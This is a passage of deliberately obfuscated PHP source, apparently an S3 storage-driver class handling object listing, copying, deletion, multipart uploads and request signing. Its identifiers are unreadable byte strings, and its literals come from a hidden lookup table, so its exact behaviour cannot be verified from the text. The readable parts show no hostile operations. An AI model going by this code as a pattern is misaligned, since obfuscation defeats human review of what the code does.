$ÎˆÓèÔ¨[8]), strlen($£¼ÍøõÂ)), $ÎˆÓèÔ¨[8]); if (substr($ô¬•îò, -1) == $ÎˆÓèÔ¨[8]) { $õì¤æ“ò = rtrim($õì¤æ“ò, $ÎˆÓèÔ¨[8]) . $ÎˆÓèÔ¨[8]; } $‚Š²½¬è = array_merge($‚Š²½¬è, $this->slicePath($õì¤æ“ò)); } $—‡¦èùƒ = array(); foreach (array_unique($‚Š²½¬è) as $Ä­ŸüÃ») { $’ßÀÏª¨ = array($ÎˆÓèÔ¨[84] => $this->getPathOuter($ÎˆÓèÔ¨[8] . $£¼ÍøõÂ . $ÎˆÓèÔ¨[8] . $Ä­ŸüÃ»), $ÎˆÓèÔ¨[75] => 1, $ÎˆÓèÔ¨[76] => 0); if (substr($Ä­ŸüÃ», -1) != $ÎˆÓèÔ¨[8]) { $’ßÀÏª¨[$ÎˆÓèÔ¨[75]] = 0; $‰Ò½É š = $this->getPath($£¼ÍøõÂ . $ÎˆÓèÔ¨[8] . $Ä­ŸüÃ»); if (isset($Õş ş¡å[$‰Ò½É š])) { $¢ÃôÂÅç = $Õş ş¡å[$‰Ò½É š]; if (isset($¢ÃôÂÅç[$ÎˆÓèÔ¨[76]])) { $’ßÀÏª¨[$ÎˆÓèÔ¨[76]] = intval($¢ÃôÂÅç[$ÎˆÓèÔ¨[76]]); } if (isset($¢ÃôÂÅç[$ÎˆÓèÔ¨[194]])) { $’ßÀÏª¨[$ÎˆÓèÔ¨[85]] = intval($¢ÃôÂÅç[$ÎˆÓèÔ¨[194]]); } } } $—‡¦èùƒ[] = $’ßÀÏª¨; } return $—‡¦èùƒ; } public function slicePath($ğ×¬µÀÖ) { $££ë‚è =& $_SERVER[íû‘ş´]; $²«å¸áË = explode($££ë‚è[8], trim($ğ×¬µÀÖ, $££ë‚è[8])); $¸ÜìÇ¥Ó = 0; do { ++$¸ÜìÇ¥Ó; $¿àæ½šÂ[] = implode($££ë‚è[8], array_slice($²«å¸áË, 0, $¸ÜìÇ¥Ó)) . $££ë‚è[8]; } while ($¸ÜìÇ¥Ó < count($²«å¸áË)); $¿àæ½šÂ[count($²«å¸áË) - 1] = $ğ×¬µÀÖ; return $¿àæ½šÂ; } public function getHost() { $·ëËï¥ =& $_SERVER[íû‘ş´]; $îâõ·²¢ = parse_url(trim($this->domain, $·ëËï¥[8])); $³Ä£¸„© = isset($îâõ·²¢[$·ëËï¥[195]]) ? $îâõ·²¢[$·ëËï¥[195]] : http_type(); $Ì„¢…Ê„ = isset($îâõ·²¢[$·ëËï¥[196]]) ? $îâõ·²¢[$·ëËï¥[196]] : $îâõ·²¢[$·ëËï¥[84]]; if (isset($îâõ·²¢[$·ëËï¥[197]])) { $Ì„¢…Ê„ .= $·ëËï¥[4] . $îâõ·²¢[$·ëËï¥[197]]; } return $³Ä£¸„© . $·ëËï¥[198] . $Ì„¢…Ê„; } public function pathEncode($£ÕÜÍÑÊ) { $ëºÊÇØÆ =& $_SERVER[íû‘ş´]; return str_replace($ëºÊÇØÆ[199], $ëºÊÇØÆ[8], rawurlencode($£ÕÜÍÑÊ)); } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\x76\64"; public $ioUploadServer = "\60"; public $ioFileOutServer = "\x30"; public $config = array(); public function __construct($ÍÍÁë•) { set_timeout(); require_once SDK_DIR . $_SERVER[íû‘ş´][200]; parent::__construct(); $this->_init($ÍÍÁë•); } public function _init($³Ùã÷») { $this->config = $³Ùã÷»; foreach ($³Ùã÷» as $¹Õ³È¼ => $ìİÅìÃ‹) { if (isset($this->{$¹Õ³È¼})) { $this->{$¹Õ³È¼} = $ìİÅìÃ‹; } } $this->endpoint = $³Ùã÷»[$_SERVER[íû‘ş´][201]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); } public function signatureVersion($°åº›£Œ = "\166\64") { $this->signVer = $°åº›£Œ; $this->client->setSignatureVersion($°åº›£Œ); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { return $this->client->getBucketCors($this->bucket); } public function isBucketCors() { $ö„‚È×Õ =& $_SERVER[íû‘ş´]; $®¿Û€¥ = $this->getBucketCors(); if (!$®¿Û€¥ || !is_array($®¿Û€¥)) { return !1; } if ($®¿Û€¥[$ö„‚È×Õ[202]] != $ö„‚È×Õ[203] || $®¿Û€¥[$ö„‚È×Õ[204]] != $ö„‚È×Õ[203]) { return !1; } $·˜£åŠ— = array_map($ö„‚È×Õ[205], $®¿Û€¥[$ö„‚È×Õ[206]]); if (!is_array($·˜£åŠ—)) { $·˜£åŠ— = array(); } $ÅŸ…ã = array($ö„‚È×Õ[207], $ö„‚È×Õ[208], $ö„‚È×Õ[209], $ö„‚È×Õ[210], $ö„‚È×Õ[211]); $½Ä•¾À… = array_diff($ÅŸ…ã, $·˜£åŠ—); return empty($½Ä•¾À…); } public function mkfile($ù½ë³ì, $ŒÊ¼Öê = '', $–ıÇ¸²õ = REPEAT_RENAME) { $Íà€µì÷ = $this->setContent($ù½ë³ì, $ŒÊ¼Öê); if ($Íà€µì÷ !== !1) { return $this->getPathOuter($ù½ë³ì); } return !1; } public function mkdir($õú€ıé, $ìëö¬ = REPEAT_SKIP) { $ı¤Ú×·° =& $_SERVER[íû‘ş´]; if (empty($õú€ıé) && $õú€ıé !== $ı¤Ú×·°[212]) { return !1; } if ($ìëö¬ && $this->_isFolder($õú€ıé)) { return $this->getPathOuter($õú€ıé); } $Ö’ÎşÆş = $this->setContent($õú€ıé, $ı¤Ú×·°[12], !0); if ($Ö’ÎşÆş !== !1) { return $this->getPathOuter($õú€ıé); } return !1; } public function copyFile($œ–î››¿, $ÍĞÓÚı, $Ü«íÌŸÔ = array()) { $¼¦…¶¶î =& $_SERVER[íû‘ş´]; $üÃ½ãù = $this->objectMeta($œ–î››¿); if (!$üÃ½ãù) { return !1; } if ($üÃ½ãù[$¼¦…¶¶î[76]] <= 1024 * 1024 * 200) { $îí—ùä = $this->client->copyObject($this->bucket, $œ–î››¿, $this->bucket, $ÍĞÓÚı, $¼¦…¶¶î[213], $Ü«íÌŸÔ); } else { $îí—ùä = $this->client->multiCopyObject($this->bucket, $œ–î››¿, $this->bucket, $ÍĞÓÚı, $Ü«íÌŸÔ); } $îí—ùä = $îí—ùä ? $this->getPathOuter($ÍĞÓÚı) : !1; return $îí—ùä; } public function moveFile($ı›å²Ó¹, $¬ùš•Õœ) { if ($this->copyFile($ı›å²Ó¹, $¬ùš•Õœ)) { $this->delFile($ı›å²Ó¹); return $this->getPathOuter($¬ùš•Õœ); } return !1; } public function delFile($ÒôàüÁ‡) { return $this->client->deleteObject($this->bucket, $ÒôàüÁ‡); } public function delFolder($”²ä••ç) { $°—ñ¨®‚ =& $_SERVER[íû‘ş´]; if (!$this->exist($”²ä••ç)) { return !0; } $this->listItemCache = !1; $—›¯é„¸ = $this->fileList($”²ä••ç); $this->listItemCache = !0; $ğãô×Î¨ = trim($”²ä••ç, $°—ñ¨®‚[8]) . $°—ñ¨®‚[8]; if (!empty($”²ä••ç) && $”²ä••ç !== $°—ñ¨®‚[212] && !in_array($ğãô×Î¨, $—›¯é„¸[$°—ñ¨®‚[82]])) { $—›¯é„¸[$°—ñ¨®‚[82]][] = $ğãô×Î¨; } $è–óˆİ­ = $this->delByBatch($—›¯é„¸[$°—ñ¨®‚[83]]); if (!$è–óˆİ­) { return !1; } $è–óˆİ­ = $this->delByBatch($—›¯é„¸[$°—ñ¨®‚[82]]); if (!$è–óˆİ­) { return !1; } return $this->delFile($ğãô×Î¨); } private function delByBatch($ë”íÆ‘×) { foreach (array_chunk($ë”íÆ‘×, 1000) as $ê‰ÏÌÀã) { $Æ˜›ŸôŸ = $this->client->deleteObjects($this->bucket, $ê‰ÏÌÀã); if (!$Æ˜›ŸôŸ) { return !1; } } return !0; } public function rename($ë“«øÅÎ, $Áµ€Åëà) { return $this->renameObject($ë“«øÅÎ, $Áµ€Åëà); } public function listPath($‹‘£ç¨½, $ÛşêÓ´ò = false) { $¬ê±û =& $_SERVER[íû‘ş´]; $ê¬ÉüÃ˜ = $this->fileList($‹‘£ç¨½, $¬ê±û[8], !0); foreach ($ê¬ÉüÃ˜[$¬ê±û[82]] as $ÆÛ»ÁÔü => $Î„ûãı) { $ê¬ÉüÃ˜[$¬ê±û[82]][$ÆÛ»ÁÔü] = $this->folderInfo($Î„ûãı, $ÛşêÓ´ò, $Î„ûãı); } foreach ($ê¬ÉüÃ˜[$¬ê±û[83]] as $ÆÛ»ÁÔü => $Î„ûãı) { $ê¬ÉüÃ˜[$¬ê±û[83]][$ÆÛ»ÁÔü] = $this->fileInfo($Î„ûãı[$¬ê±û[32]], $ÛşêÓ´ò, $Î„ûãı); } return $ê¬ÉüÃ˜; } protected function infoChildren($ëÖ®ÁÙÓ, &$ÀÛÙáÁ) { $å™áŸ¶Æ =& $_SERVER[íû‘ş´]; $¡­áß¢ = $this->fileList($ëÖ®ÁÙÓ, $å™áŸ¶Æ[12], !0); $ÀÛÙáÁ[$å™áŸ¶Æ[78]] += count($¡­áß¢[$å™áŸ¶Æ[82]]); $ÀÛÙáÁ[$å™áŸ¶Æ[77]] += count($¡­áß¢[$å™áŸ¶Æ[83]]); foreach ($¡­áß¢[$å™áŸ¶Æ[83]] as $ò²„ª”È) { if (!$ò²„ª”È || !$ò²„ª”È[$å™áŸ¶Æ[76]]) { continue; } $ÀÛÙáÁ[$å™áŸ¶Æ[76]] += $ò²„ª”È[$å™áŸ¶Æ[76]]; } } private function fileInfo($‰¨ùúÀ¯, $§ñÓ˜ = false, $•×üèøÏ = array()) { $ƒ­³«­± =& $_SERVER[íû‘ş´]; $ŞÆŠ†ı© = array($ƒ­³«­±[32] => $this->pathThis($‰¨ùúÀ¯), $ƒ­³«­±[84] => $this->getPathOuter($‰¨ùúÀ¯), $ƒ­³«­±[33] => $ƒ­³«­±[214], $ƒ­³«­±[175] => $this->ext($‰¨ùúÀ¯), $ƒ­³«­±[76] => isset($•×üèøÏ[$ƒ­³«­±[76]]) ? $•×üèøÏ[$ƒ­³«­±[76]] : 0); if ($§ñÓ˜) { return $ŞÆŠ†ı©; } $ŞÆŠ†ı©[$ƒ­³«­±[215]] = $ŞÆŠ†ı©[$ƒ­³«­±[85]] = 0; $ŞÆŠ†ı©[$ƒ­³«­±[216]] = $ŞÆŠ†ı©[$ƒ­³«­±[217]] = !0; if (empty($•×üèøÏ)) { $•×üèøÏ = $this->objectMeta($‰¨ùúÀ¯); if (!$•×üèøÏ) { return $ŞÆŠ†ı©; } } if (isset($•×üèøÏ[$ƒ­³«­±[218]]) && $•×üèøÏ[$ƒ­³«­±[218]]) { $ŞÆŠ†ı©[$ƒ­³«­±[219]] = $•×üèøÏ[$ƒ­³«­±[218]]; } if (isset($•×üèøÏ[$ƒ­³«­±[194]])) { $ŞÆŠ†ı©[$ƒ­³«­±[85]] = $•×üèøÏ[$ƒ­³«­±[194]]; } if (isset($•×üèøÏ[$ƒ­³«­±[76]])) { $ŞÆŠ†ı©[$ƒ­³«­±[76]] = $•×üèøÏ[$ƒ­³«­±[76]]; } return $ŞÆŠ†ı©; } private function folderInfo($ÏÄş­Ò„, $û´‡„Ë = false, $¸ôóà¾Ö = array()) { $ĞŸü®üü =& $_SERVER[íû‘ş´]; $úÇ©¹øó = array($ĞŸü®üü[32] => $this->pathThis($ÏÄş­Ò„), $ĞŸü®üü[84] => $this->getPathOuter($ĞŸü®üü[8] . $ÏÄş­Ò„), $ĞŸü®üü[33] => $ĞŸü®üü[75]); if ($û´‡„Ë) { return $úÇ©¹øó; } $úÇ©¹øó[$ĞŸü®üü[215]] = $úÇ©¹øó[$ĞŸü®üü[85]] = 0; $úÇ©¹øó[$ĞŸü®üü[216]] = $úÇ©¹øó[$ĞŸü®üü[217]] = !0; if ($ÏÄş­Ò„ == $ĞŸü®üü[12]) { return $úÇ©¹øó; } if (empty($¸ôóà¾Ö)) { $¸ôóà¾Ö = $this->objectMeta(trim($ÏÄş­Ò„, $ĞŸü®üü[8]) . $ĞŸü®üü[8]); } if (isset($¸ôóà¾Ö[$ĞŸü®üü[194]])) { $úÇ©¹øó[$ĞŸü®üü[215]] = $¸ôóà¾Ö[$ĞŸü®üü[194]]; } return $úÇ©¹øó; } private function fileList($éš”©¢ã, $»ğ×Ôú = '', $Ğ¢³’¤ñ = 0) { $±ê›ä =& $_SERVER[íû‘ş´]; $±ÊÂé¬È = rtrim($éš”©¢ã, $±ê›ä[8]) . $±ê›ä[8]; $›°—´Ÿ¼ = $this->listObjs($±ÊÂé¬È, null, null, $»ğ×Ôú); if (!$›°—´Ÿ¼) { return array($±ê›ä[82] => array(), $±ê›ä[83] => array()); } $òìíıõœ = $’éÓâÂ = array(); foreach ($›°—´Ÿ¼[$±ê›ä[220]] as $Ï˜š¢âÀ) { $Ãæ“©¤µ = $Ï˜š¢âÀ[$±ê›ä[32]]; if ($Ãæ“©¤µ == $±ÊÂé¬È) { continue; } $´ŞÙ­˜ü = isset($Ï˜š¢âÀ[$±ê›ä[76]]) ? $Ï˜š¢âÀ[$±ê›ä[76]] : 0; $Óµ„íµå = $´ŞÙ­˜ü == 0 && substr($Ãæ“©¤µ, strlen($Ãæ“©¤µ) - 1, 1) == $±ê›ä[8] ? !0 : !1; $this->cacheMethodInfoSet($Ãæ“©¤µ, $Óµ„íµå, $Ï˜š¢âÀ); if ($Óµ„íµå) { $òìíıõœ[] = $Ãæ“©¤µ; continue; } $’éÓâÂ[] = $Ğ¢³’¤ñ ? $Ï˜š¢âÀ : $Ãæ“©¤µ; } foreach ($›°—´Ÿ¼[$±ê›ä[221]] as $Ï˜š¢âÀ) { $òìíıõœ[] = $Ï˜š¢âÀ[$±ê›ä[32]]; $this->cacheMethodInfoSet($Ï˜š¢âÀ[$±ê›ä[32]], !0); } $this->cacheMethodInfoSet($éš”©¢ã, !0); return array($±ê›ä[82] => $òìíıõœ, $±ê›ä[83] => $’éÓâÂ); } private function listObjs($‹Ê†çÅı, $åë¸¸”æ = null, $©«î”€ = null, $‚›éÇ×á = null) { $íÅÉ£ùî =& $_SERVER[íû‘ş´]; $‹Ê†çÅı = trim($‹Ê†çÅı, $íÅÉ£ùî[8]); $Èçä¹‚ = empty($‹Ê†çÅı) && $‹Ê†çÅı !== $íÅÉ£ùî[212] ? $íÅÉ£ùî[12] : $‹Ê†çÅı . $íÅÉ£ùî[8]; return $this->client->getBucket($this->bucket, $Èçä¹‚, $åë¸¸”æ, $©«î”€, $‚›éÇ×á, !0); } public function has($ŒŒè²•›, $œØÂ¯Ú„ = false, $ø·Ø´ = true) { $’á½×ˆ¸ =& $_SERVER[íû‘ş´]; $ŒŒè²•› = trim($ŒŒè²•›, $’á½×ˆ¸[8]); $ÕıÔœ’ = empty($ŒŒè²•›) && $ŒŒè²•› !== $’á½×ˆ¸[212] ? $’á½×ˆ¸[12] : $ŒŒè²•› . $’á½×ˆ¸[8]; $üúÂ¹¬Ï = null; $ºçÕˆŒ© = 500; $¿ê¡±¹¶ = $’á½×ˆ¸[8]; $Äşì¤¾ò = $†íëƒå = array(); while (!0) { $šøÀ¼“ = $this->listObjs($ŒŒè²•›, $üúÂ¹¬Ï, $ºçÕˆŒ©, $¿ê¡±¹¶); if (!$šøÀ¼“) { break; } $üúÂ¹¬Ï = $šøÀ¼“[$’á½×ˆ¸[222]]; $ê¼˜ÖşÜ = $šøÀ¼“[$’á½×ˆ¸[220]]; $•ÃµÔñ = $šøÀ¼“[$’á½×ˆ¸[221]]; if (empty($ê¼˜ÖşÜ) && empty($•ÃµÔñ)) { break; } if (count($ê¼˜ÖşÜ) == 1 && $ê¼˜ÖşÜ[0][$’á½×ˆ¸[32]] == $ÕıÔœ’) { break; } if ($œØÂ¯Ú„) { if (count($ê¼˜ÖşÜ)) { $ê¼˜ÖşÜ = array_column($ê¼˜ÖşÜ, $’á½×ˆ¸[32]); $Äşì¤¾ò = array_merge($Äşì¤¾ò, $ê¼˜ÖşÜ); } if (count($•ÃµÔñ)) { $•ÃµÔñ = array_column($•ÃµÔñ, $’á½×ˆ¸[32]); $†íëƒå = array_merge($†íëƒå, $•ÃµÔñ); } if ($üúÂ¹¬Ï === null) { break; } continue; } if ($ø·Ø´) { if (!empty($ê¼˜ÖşÜ)) { if (count($ê¼˜ÖşÜ) > 1 || isset($ê¼˜ÖşÜ[0][$’á½×ˆ¸[32]]) && $ê¼˜ÖşÜ[0][$’á½×ˆ¸[32]] != $ÕıÔœ’) { return !0; } } } else { if (!empty($•ÃµÔñ)) { return !0; } } if ($üúÂ¹¬Ï === null) { break; } } if ($œØÂ¯Ú„) { $Äşì¤¾ò = array_diff($Äşì¤¾ò, array($ÕıÔœ’)); $Äşì¤¾ò = count(array_unique($Äşì¤¾ò)); $†íëƒå = count(array_unique($†íëƒå)); return array($’á½×ˆ¸[223] => $Äşì¤¾ò, $’á½×ˆ¸[224] => $†íëƒå); } return !1; } public function listAll($˜×ÕÛª×) { $£¼î®éû =& $_SERVER[íû‘ş´]; $°ìÈúÀ˜ = $this->fileList($˜×ÕÛª×, $£¼î®éû[12], !0); $û›ÔÌºÇ = array_to_keyvalue($°ìÈúÀ˜[$£¼î®éû[83]], $£¼î®éû[32]); foreach ($°ìÈúÀ˜[$£¼î®éû[82]] as $óğşãúä) { if (is_string($óğşãúä)) { $û›ÔÌºÇ[$óğşãúä] = array($£¼î®éû[76] => 0); } } return $this->listAllFiles($˜×ÕÛª×, $û›ÔÌºÇ); } public function canRead($ãê†¿Íß) { $ÏÆ³É‘¿ =& $_SERVER[íû‘ş´]; $ÂËúÒ‡³ = $this->client->getAccessControlPolicy($this->bucket, $ãê†¿Íß); if (!$ÂËúÒ‡³) { return !1; } return in_array($ÂËúÒ‡³, array($ÏÆ³É‘¿[225], $ÏÆ³É‘¿[226], $ÏÆ³É‘¿[227])) ? !0 : !1; } public function canWrite($ì×âç•ê) { $êÇ¦Š¬ =& $_SERVER[íû‘ş´]; $ÒÙ¿¤Õ  = $this->client->getAccessControlPolicy($this->bucket, $ì×âç•ê); if (!$ÒÙ¿¤Õ ) { return !1; } return in_array($ÒÙ¿¤Õ , array($êÇ¦Š¬[225], $êÇ¦Š¬[226])) ? !0 : !1; } public function getContent($øĞ«Ïç®) { return $this->client->getObject($this->bucket, $øĞ«Ïç®); } public function setContent($¾ğç¼âŠ, $ŒšØ®Ó = '', $Ñ°â­âÌ = false) { $øÑÄç±ê =& $_SERVER[íû‘ş´]; $¾ğç¼âŠ = $Ñ°â­âÌ ? trim($¾ğç¼âŠ, $øÑÄç±ê[8]) . $øÑÄç±ê[8] : $¾ğç¼âŠ; $Ã¶´ Š = get_file_mime(get_path_ext($¾ğç¼âŠ)); $¥È˜Š‰… = $this->client->putObject($ŒšØ®Ó, $this->bucket, $¾ğç¼âŠ, $øÑÄç±ê[213], array(), $Ã¶´ Š); if (!$¥È˜Š‰…) { return !1; } if ($Ñ°â­âÌ) { return !0; } $this->cacheMethod(null, null); $¥È˜Š‰… = $this->copyFile($¾ğç¼âŠ, $¾ğç¼âŠ, array($øÑÄç±ê[228] => $¥È˜Š‰…[$øÑÄç±ê[218]])); return $¥È˜Š‰… ? !0 : !1; } public function fileSubstr($œšÀ‰õ‚, $¸–ßšÎô, $šˆÌ¨Ã) { $Ğ¶ÀÇ¸ã = $¸–ßšÎô + $šˆÌ¨Ã - 1; return $this->client->getObject($this->bucket, $œšÀ‰õ‚, array($_SERVER[íû‘ş´][229] => "\142\171\x74\145\163\75{$¸–ßšÎô}\x2d{$Ğ¶ÀÇ¸ã}")); } public function upload($­ë´†àˆ, $ÎœÙŠ ˆ, $ÑúÔËù  = false, $×³î„ä… = REPEAT_REPLACE) { $¦ğ¶ùğˆ =& $_SERVER[íû‘ş´]; $ì»Á½Ñ = array($¦ğ¶ùğˆ[228] => @md5_file($ÎœÙŠ ˆ)); $Ù‹Üª‰Å = array($¦ğ¶ùğˆ[230] => get_file_mime(get_path_ext($­ë´†àˆ))); if (IO::size($ÎœÙŠ ˆ) <= 1024 * 1024 * 200) { $ÂïŞŞ½ = $this->client->putObjectFile($ÎœÙŠ ˆ, $this->bucket, $­ë´†àˆ, $¦ğ¶ùğˆ[213], $ì»Á½Ñ, $Ù‹Üª‰Å); return !empty($ÂïŞŞ½) ? $this->getPathOuter($­ë´†àˆ) : !1; } $œ‹™Ò¸« = $this->client->multiUploadObject($ÎœÙŠ ˆ, $this->bucket, trim($­ë´†àˆ, $¦ğ¶ùğˆ[8]), $ì»Á½Ñ, $Ù‹Üª‰Å); return $œ‹™Ò¸« ? $this->getPathOuter($­ë´†àˆ) : !1; } public function download($Ñ§Æî¦é, $¢Á£ü¤é) { if (!@is_dir($this->pathFather($¢Á£ü¤é)) && !IO::mkdir($this->pathFather($¢Á£ü¤é))) { return !1; } $²µ—¡–Â = $this->client->getObject($this->bucket, $Ñ§Æî¦é, array(), $¢Á£ü¤é); return $²µ—¡–Â !== !1 ? $¢Á£ü¤é : !1; } public function link($„Ä£ûâÛ, $óáèıÙ¾ = array()) { $Å†“‰’í =& $_SERVER[íû‘ş´]; if ($this->signVer == $Å†“‰’í[231]) { return $this->client->getAuthenticatedURL($this->bucket, $„Ä£ûâÛ, 3600 * 12, $óáèıÙ¾); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($„Ä£ûâÛ, $Å†“‰’í[8]), 3600 * 12, $this->region, array(), !0, $óáèıÙ¾); } public function fileOut($àœÇĞ£‰, $¼¦µßØÁ = false, $úéè¢æ¨ = false, $ËÄ¢²ì‰ = '') { $İ„ ÍìÔ =& $_SERVER[íû‘ş´]; if ($this->isFileOutServer()) { return $this->fileOutServer($àœÇĞ£‰, $¼¦µßØÁ, $úéè¢æ¨, $ËÄ¢²ì‰); } if (!$úéè¢æ¨) { $úéè¢æ¨ = $this->pathThis($àœÇĞ£‰); } $›ãÑ£ú„ = get_file_mime(get_path_ext($úéè¢æ¨)); if ($›ãÑ£ú„ == $İ„ ÍìÔ[232]) { return parent::fileOut($àœÇĞ£‰, $¼¦µßØÁ, $úéè¢æ¨, $ËÄ¢²ì‰); } $›´¿ÇÃ— = array($İ„ ÍìÔ[233] => $›ãÑ£ú„); if ($¼¦µßØÁ) { $›´¿ÇÃ—[$İ„ ÍìÔ[234]] = $İ„ ÍìÔ[235] . rawurlencode($úéè¢æ¨); } else { } $ğ”¤·€ = $this->link($àœÇĞ£‰, $›´¿ÇÃ—); $this->fileOutLink($ğ”¤·€); } public function fileOutServer($Õ”ÎÜª­, $ıèŠ”Ê = false, $ã µÚîÎ = false, $Ö“ÈŒ”ò = '') { parent::fileOut($Õ”ÎÜª­, $ıèŠ”Ê, $ã µÚîÎ, $Ö“ÈŒ”ò); } public function fileOutImageServer($Ã„¦İÜ‹, $é«şŠÔ = 250) { parent::fileOutImage($Ã„¦İÜ‹, $é«şŠÔ); } public function hashMd5($Üµ¾ñõø, $µ£ãÎĞô = '') { $²—¢äş« =& $_SERVER[íû‘ş´]; $¶Ãêé¥ä = $this->objectMeta($Üµ¾ñõø); if (!$¶Ãêé¥ä) { return !1; } $µ£ãÎĞô = $µ£ãÎĞô ? $µ£ãÎĞô : _get($¶Ãêé¥ä, $²—¢äş«[236]); $µ£ãÎĞô = $µ£ãÎĞô ? $µ£ãÎĞô : _get($¶Ãêé¥ä, $²—¢äş«[218], $²—¢äş«[12]); return $µ£ãÎĞô; } public function uploadFormData($­ç€âÜ“, $á„¹€Û¤ = 3600) { $´İ‘İ¸ =& $_SERVER[íû‘ş´]; $ÍºÛÊ²€ = $this->pathFather($­ç€âÜ“); $ğî´’–½ = $this->client->getHttpUploadPostParams($this->bucket, $ÍºÛÊ²€, $´İ‘İ¸[213], $á„¹€Û¤); return array_merge((array) $ğî´’–½, array($´İ‘İ¸[196] => $this->getHost())); } public function multiUploadFormData($Ù»…Ò«Ò, $§×¼¦¸Ä = 3600) { $¬üÅ‚Ø¬ =& $_SERVER[íû‘ş´]; $÷ïÏ¹•« = gmdate($¬üÅ‚Ø¬[237]); $ éØã¯ = array(); $áâÂ‚Ì = $this->client->getUploadId($this->bucket, $Ù»…Ò«Ò, $ éØã¯); if (!$áâÂ‚Ì) { return !1; } return array($¬üÅ‚Ø¬[238] => $áâÂ‚Ì, $¬üÅ‚Ø¬[196] => $this->getHost() . $¬üÅ‚Ø¬[8] . $this->pathEncode($Ù»…Ò«Ò), $¬üÅ‚Ø¬[239] => $÷ïÏ¹•«, $¬üÅ‚Ø¬[94] => $Ù»…Ò«Ò); } public function multiUploadAuthData($¾şáûÜë, $ ÷§¦—© = array()) { $æÈéµ„š =& $_SERVER[íû‘ş´]; $Ïíè˜Ì§ = isset($ ÷§¦—©[$æÈéµ„š[239]]) ? $ ÷§¦—©[$æÈéµ„š[239]] : gmdate($æÈéµ„š[237]); $ÍÇÅìò‡ = isset($ ÷§¦—©[$æÈéµ„š[175]]) ? $ ÷§¦—©[$æÈéµ„š[175]] : $æÈéµ„š[12]; $ÎÈ³Ü²Ç = $ ÷§¦—©[$æÈéµ„š[94]]; unset($ ÷§¦—©[$æÈéµ„š[94]]); if (isset($ ÷§¦—©[$æÈéµ„š[240]])) { $ ÷§¦—©[$æÈéµ„š[239]] = $Ïíè˜Ì§; return $this->listUploadParts($ÎÈ³Ü²Ç, $ ÷§¦—©); } $„‡ÁÚÎœ = array($æÈéµ„š[241], $æÈéµ„š[12], $æÈéµ„š[120], $æÈéµ„š[12], "\x78\x2d\141\155\172\55\144\141\164\x65\x3a{$Ïíè˜Ì§}", $æÈéµ„š[8] . $this->bucket . $æÈéµ„š[8] . $this->pathEncode($ÎÈ³Ü²Ç) . $ÍÇÅìò‡); if (strpos($ÍÇÅìò‡, $æÈéµ„š[242]) === 0) { $„‡ÁÚÎœ[0] = $æÈéµ„š[243]; } if (isset($ ÷§¦—©[$æÈéµ„š[244]]) && $ ÷§¦—©[$æÈéµ„š[244]] == $æÈéµ„š[245]) { $„‡ÁÚÎœ[0] = $æÈéµ„š[245]; } $ßÅĞÏ = implode($æÈéµ„š[246], $„‡ÁÚÎœ); $Î“ğé‚ = base64_encode(hash_hmac($æÈéµ„š[247], $ßÅĞÏ, $this->secret, !0)); $¾é¡š“Á = $æÈéµ„š[248] . $this->accessKey . $æÈéµ„š[4] . $Î“ğé‚; if (strpos($ÍÇÅìò‡, $æÈéµ„š[242]) === 0) { return array($æÈéµ„š[249] => $¾é¡š“Á, $æÈéµ„š[239] => $Ïíè˜Ì§); } return $¾é¡š“Á; } public function listUploadParts($É—ãÑ‘, $ä »Çû© = array()) { $‰à”¬ı½ =& $_SERVER[íû‘ş´]; $¢á¯è» = str_replace($‰à”¬ı½[250], $‰à”¬ı½[12], $ä »Çû©[$‰à”¬ı½[175]]); $®¹ï“×‚ = $this->client->listParts($this->bucket, $É—ãÑ‘, $¢á¯è»); if (!$®¹ï“×‚) { return !1; } unset($ä »Çû©[$‰à”¬ı½[240]], $ä »Çû©[$‰à”¬ı½[244]]); $ä »Çû©[$‰à”¬ı½[94]] = $É—ãÑ‘; $ƒ˜‘©ù = $this->multiUploadAuthData($É—ãÑ‘, $ä »Çû©); if (empty($ƒ˜‘©ù)) { return !1; } return array($‰à”¬ı½[249] => $ƒ˜‘©ù, $‰à”¬ı½[239] => $ä »Çû©[$‰à”¬ı½[239]], $‰à”¬ı½[251] => $®¹ï“×‚); } public function getHost() { return parent::getHost() . $_SERVER[íû‘ş´][8] . $this->bucket; } public function size($ÁÔÆÎ¬ò) { $óÆóµ‰ò = $this->objectMeta($ÁÔÆÎ¬ò); return $óÆóµ‰ò ? $óÆóµ‰ò[$_SERVER[íû‘ş´][76]] : 0; } public function info($şœı¥´°) { if ($this->isFolder($şœı¥´°)) { return $this->folderInfo($şœı¥´°); } else { if ($this->isFile($şœı¥´°)) { return $this->fileInfo($şœı¥´°); } } return !1; } public function exist($Úì°€¹ƒ) { return $this->isFile($Úì°€¹ƒ) || $this->isFolder($Úì°€¹ƒ); } public function isFile($ñÓµû¦È) { return !$this->isFolder($ñÓµû¦È) && $this->objectMeta($ñÓµû¦È); } public function isFolder($×­›¹Œˆ) { return $this->cacheMethod($_SERVER[íû‘ş´][166], $×­›¹Œˆ); } protected function objectMeta($†û”¸ˆµ) { return $this->cacheMethod($_SERVER[íû‘ş´][168], $†û”¸ˆµ); } protected function _objectMeta($º•Ÿêæá) { $Î¶Š¯‰¯ =& $_SERVER[íû‘ş´]; $º•Ÿêæá = rtrim($º•Ÿêæá, $Î¶Š¯‰¯[8]); try { $Ç÷¯½¶ = $this->client->getObjectInfo($this->bucket, $º•Ÿêæá); if (!isset($Ç÷¯½¶[$Î¶Š¯‰¯[236]]) && isset($Ç÷¯½¶[$Î¶Š¯‰¯[252]])) { $Ç÷¯½¶[$Î¶Š¯‰¯[236]] = $Ç÷¯½¶[$Î¶Š¯‰¯[252]]; } } catch (Exception $ÉÌ‡Ø‹Å) { $Ç÷¯½¶ = !1; } if (!$Ç÷¯½¶) { } return $Ç÷¯½¶; } protected function _isFolder($­­÷’„ ) { $øÏ‡©è† =& $_SERVER[íû‘ş´]; $­­÷’„  = rtrim($­­÷’„ , $øÏ‡©è†[8]); if ($­­÷’„  == $øÏ‡©è†[12] || $­­÷’„  == $øÏ‡©è†[8]) { return !0; } $çŸî˜ÊÄ = $this->client->getBucket($this->bucket, $­­÷’„ , null, 1); if (empty($çŸî˜ÊÄ[$øÏ‡©è†[220]])) { return !1; } $‚­Ò‰à = 